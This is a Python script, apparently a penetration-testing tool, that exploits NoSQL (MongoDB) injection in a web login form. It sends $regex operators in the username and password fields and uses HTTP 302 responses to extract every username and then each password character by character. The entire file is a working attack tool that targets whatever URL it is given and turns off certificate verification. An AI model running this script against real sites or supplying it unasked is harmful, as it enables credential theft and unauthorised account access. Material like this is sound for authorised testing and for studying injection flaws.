#!/usr/bin/python3

# brute force a nosql (mongo) database via web login form
# python3 version of this: https://book.hacktricks.xyz/pentesting-web/nosql-injection

import requests
import string
import argparse

# possible chars for the brute forcing
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]

# args
arg_parser = argparse.ArgumentParser(description='NoSQL Login Brute Forcer')
arg_parser.add_argument('--url', dest='url', help='The URL of the server, http://10.10.10.10/login', type=str, required=True)
arg_parser.add_argument('--vhost', dest='vhost', help='Optional Virtual Host, used as host header', type=str)
args = arg_parser.parse_args()

url = args.url
headers = {}
if args.vhost:
    headers = {"Host": args.vhost}

def get_password(username):
    print(f"Extracting password of {username}")
    params = {"username": username, "password[$regex]": "", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = f"{password}{c}.*"
            pr = requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                print(password)
                password += c
                break
        if c == possible_chars[-1]:
            passwd = password[1:].replace("\\", "")
            print(f"Found password {passwd} for username {username}")
            return passwd

def get_usernames():
    usernames = []
    params = {"username[$regex]": "", "password[$regex]": ".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = f"{username}.*"
        pr = requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print(f"Found username starting with {c}")
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = f"{username}{c2}.*"
                    if int(requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print(f"Found username: {username[1:]}")
                    usernames.append(username[1:])
                    break
    return usernames

print(f'Attempting to get usernames and passwords from {url}...')
for u in get_usernames():
    get_password(u)
